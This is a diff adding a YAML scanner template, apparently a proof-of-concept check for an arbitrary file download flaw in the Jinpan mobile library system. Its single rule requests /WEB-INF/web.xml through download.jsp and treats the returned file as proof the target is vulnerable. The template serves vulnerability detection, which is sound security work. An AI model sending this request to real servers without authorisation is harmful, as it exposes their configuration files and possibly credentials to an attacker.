@@ -1,0 +1,17 @@
+id: jp-ydtsgxt-filedownload
+
+info:
+  name: 金盘 移动图书馆系统 download.jsp 任意文件下载
+  author: peiqi
+  severity: high
+  verified: true
+  description: |
+    金盘 微信管理平台 download接口存在任意文件下载漏洞，攻击者通过漏洞可以读取服务器上的敏感文件
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /pages/admin/tools/file/download.jsp?items=/WEB-INF/web.xml
+    expression: response.status == 200 && response.body.bcontains(b'<web-app') && response.body.bcontains(b'</web-app>') 
+expression: r0()
